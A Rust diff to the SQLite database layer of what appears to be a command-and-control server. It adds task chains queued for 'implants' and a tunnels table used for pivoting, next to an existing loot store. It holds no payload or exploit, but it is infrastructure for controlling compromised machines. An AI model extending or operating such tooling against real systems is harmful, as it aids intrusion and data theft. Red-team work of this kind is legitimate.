@@ -54,7 +54,9 @@ impl Database {
                 dispatched_at TEXT,
                 completed_at  TEXT,
                 output        BLOB,
-                success       INTEGER
+                success       INTEGER,
+                chain_id      INTEGER,
+                chain_seq     INTEGER NOT NULL DEFAULT 0
             );
 
             CREATE TABLE IF NOT EXISTS events (
@@ -63,6 +65,28 @@ impl Database {
                 agent_id    BLOB(16),
                 task_id     INTEGER,
                 detail      TEXT,
+                created_at  TEXT NOT NULL
+            );
+
+            CREATE TABLE IF NOT EXISTS chains (
+                id          INTEGER PRIMARY KEY AUTOINCREMENT,
+                agent_id    BLOB(16) NOT NULL REFERENCES implants(agent_id),
+                status      TEXT NOT NULL DEFAULT 'pending',
+                created_at  TEXT NOT NULL,
+                total_tasks INTEGER NOT NULL DEFAULT 0,
+                completed   INTEGER NOT NULL DEFAULT 0
+            );
+
+            CREATE TABLE IF NOT EXISTS tunnels (
+                id          INTEGER PRIMARY KEY AUTOINCREMENT,
+                agent_id    BLOB(16) NOT NULL REFERENCES implants(agent_id),
+                tunnel_type TEXT NOT NULL,
+                bind_addr   TEXT NOT NULL,
+                bind_port   INTEGER NOT NULL,
+                remote_addr TEXT NOT NULL DEFAULT '',
+                remote_port INTEGER NOT NULL DEFAULT 0,
+                status      TEXT NOT NULL DEFAULT 'active',
+                task_id     INTEGER,
                 created_at  TEXT NOT NULL
             );
 
@@ -283,7 +307,7 @@ impl Database {
         let conn = self.conn.lock().unwrap();
         let mut stmt = conn.prepare(
             "SELECT id, agent_id, task_type, data, status, created_at, dispatched_at,
-                    completed_at, output, success
+                    completed_at, output, success, chain_id, chain_seq
              FROM tasks WHERE id = ?1",
         )?;
         let mut rows = stmt.query_map(params![task_id], |row| {
@@ -303,6 +327,8 @@ impl Database {
                 completed_at: row.get(7)?,
                 output: row.get(8)?,
                 success: row.get(9)?,
+                chain_id: row.get(10)?,
+                chain_seq: row.get::<_, Option<i64>>(11)?.unwrap_or(0),
             })
         })?;
         rows.next().transpose()
@@ -312,7 +338,7 @@ impl Database {
         let conn = self.conn.lock().unwrap();
         let mut stmt = conn.prepare(
             "SELECT id, agent_id, task_type, data, status, created_at, dispatched_at,
-                    completed_at, output, success
+                    completed_at, output, success, chain_id, chain_seq
              FROM tasks WHERE agent_id = ?1 ORDER BY id DESC",
         )?;
         let rows = stmt
@@ -333,6 +359,8 @@ impl Database {
                     completed_at: row.get(7)?,
                     output: row.get(8)?,
                     success: row.get(9)?,
+                    chain_id: row.get(10)?,
+                    chain_seq: row.get::<_, Option<i64>>(11)?.unwrap_or(0),
                 })
             })?
             .collect::<SqlResult<Vec<_>>>()?;
@@ -340,6 +368,142 @@ impl Database {
     }
 
     // --- Events ---
+
+    // --- Chains ---
+
+    pub fn create_chain(&self, agent_id: &[u8; 16], total_tasks: i64) -> SqlResult<i64> {
+        let conn = self.conn.lock().unwrap();
+        let now = chrono::Utc::now().to_rfc3339();
+        conn.execute(
+            "INSERT INTO chains (agent_id, status, created_at, total_tasks)
+             VALUES (?1, 'pending', ?2, ?3)",
+            params![agent_id.as_slice(), now, total_tasks],
+        )?;
+        Ok(conn.last_insert_rowid())
+    }
+
+    pub fn queue_chained_task(
+        &self,
+        agent_id: &[u8; 16],
+        task_type: u8,
+        data: &[u8],
+        chain_id: i64,
+        chain_seq: i64,
+    ) -> SqlResult<i64> {
+        let conn = self.conn.lock().unwrap();
+        let now = chrono::Utc::now().to_rfc3339();
+        let status = if chain_seq == 0 { "pending" } else { "chained" };
+        conn.execute(
+            "INSERT INTO tasks (agent_id, task_type, data, status, created_at, chain_id, chain_seq)
+             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
+            params![agent_id.as_slice(), task_type, data, status, now, chain_id, chain_seq],
+        )?;
+        Ok(conn.last_insert_rowid())
+    }
+
+    pub fn advance_chain(&self, chain_id: i64) -> SqlResult<bool> {
+        let conn = self.conn.lock().unwrap();
+        let now = chrono::Utc::now().to_rfc3339();
+        conn.execute(
+            "UPDATE chains SET completed = completed + 1 WHERE id = ?1",
+            params![chain_id],
+        )?;
+
+        let (total, completed): (i64, i64) = conn.query_row(
+            "SELECT total_tasks, completed FROM chains WHERE id = ?1",
+            params![chain_id],
+            |row| Ok((row.get(0)?, row.get(1)?)),
+        )?;
+
+        if completed >= total {
+            conn.execute(
+                "UPDATE chains SET status = 'completed' WHERE id = ?1",
+                params![chain_id],
+            )?;
+            return Ok(false);
+        }
+
+        let promoted = conn.execute(
+            "UPDATE tasks SET status = 'pending' WHERE chain_id = ?1 AND chain_seq = ?2 AND status = 'chained'",
+            params![chain_id, completed],
+        )?;
+
+        if promoted == 0 {
+            conn.execute(
+                "UPDATE chains SET status = 'completed' WHERE id = ?1",
+                params![chain_id],
+            )?;
+        } else {
+            let _ = conn.execute(
+                "UPDATE chains SET status = 'running' WHERE id = ?1",
+                params![chain_id],
+            );
+        }
+
+        let _ = now;
+        Ok(promoted > 0)
+    }
+
+    // --- Tunnels ---
+
+    pub fn insert_tunnel(
+        &self,
+        agent_id: &[u8; 16],
+        tunnel_type: &str,
+        bind_addr: &str,
+        bind_port: i64,
+        remote_addr: &str,
+        remote_port: i64,
+        task_id: Option<i64>,
+    ) -> SqlResult<i64> {
+        let conn = self.conn.lock().unwrap();
+        let now = chrono::Utc::now().to_rfc3339();
+        conn.execute(
+            "INSERT INTO tunnels (agent_id, tunnel_type, bind_addr, bind_port, remote_addr, remote_port, task_id, created_at)
+             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
+            params![agent_id.as_slice(), tunnel_type, bind_addr, bind_port, remote_addr, remote_port, task_id, now],
+        )?;
+        Ok(conn.last_insert_rowid())
+    }
+
+    pub fn list_tunnels(&self) -> SqlResult<Vec<TunnelRow>> {
+        let conn = self.conn.lock().unwrap();
+        let mut stmt = conn.prepare(
+            "SELECT id, agent_id, tunnel_type, bind_addr, bind_port, remote_addr, remote_port, status, task_id, created_at
+             FROM tunnels ORDER BY id DESC",
+        )?;
+        let rows = stmt
+            .query_map([], |row| {
+                let id_blob: Vec<u8> = row.get(1)?;
+                let mut agent_id = [0u8; 16];
+                if id_blob.len() == 16 {
+                    agent_id.copy_from_slice(&id_blob);
+                }
+                Ok(TunnelRow {
+                    id: row.get(0)?,
+                    agent_id,
+                    tunnel_type: row.get(2)?,
+                    bind_addr: row.get(3)?,
+                    bind_port: row.get(4)?,
+                    remote_addr: row.get(5)?,
+                    remote_port: row.get(6)?,
+                    status: row.get(7)?,
+                    task_id: row.get(8)?,
+                    created_at: row.get(9)?,
+                })
+            })?
+            .collect::<SqlResult<Vec<_>>>()?;
+        Ok(rows)
+    }
+
+    pub fn close_tunnel(&self, tunnel_id: i64) -> SqlResult<bool> {
+        let conn = self.conn.lock().unwrap();
+        let changed = conn.execute(
+            "UPDATE tunnels SET status = 'closed' WHERE id = ?1",
+            params![tunnel_id],
+        )?;
+        Ok(changed > 0)
+    }
 
     // --- Loot ---
 
@@ -506,6 +670,20 @@ pub struct LootRow {
 }
 
 #[derive(Debug, Clone)]
+pub struct TunnelRow {
+    pub id: i64,
+    pub agent_id: [u8; 16],
+    pub tunnel_type: String,
+    pub bind_addr: String,
+    pub bind_port: i64,
+    pub remote_addr: String,
+    pub remote_port: i64,
+    pub status: String,
+    pub task_id: Option<i64>,
+    pub created_at: String,
+}
+
+#[derive(Debug, Clone)]
 pub struct FullTaskRow {
     pub id: i64,
     pub agent_id: [u8; 16],
@@ -517,4 +695,6 @@ pub struct FullTaskRow {
     pub completed_at: Option<String>,
     pub output: Option<Vec<u8>>,
     pub success: Option<i32>,
+    pub chain_id: Option<i64>,
+    pub chain_seq: i64,
 }
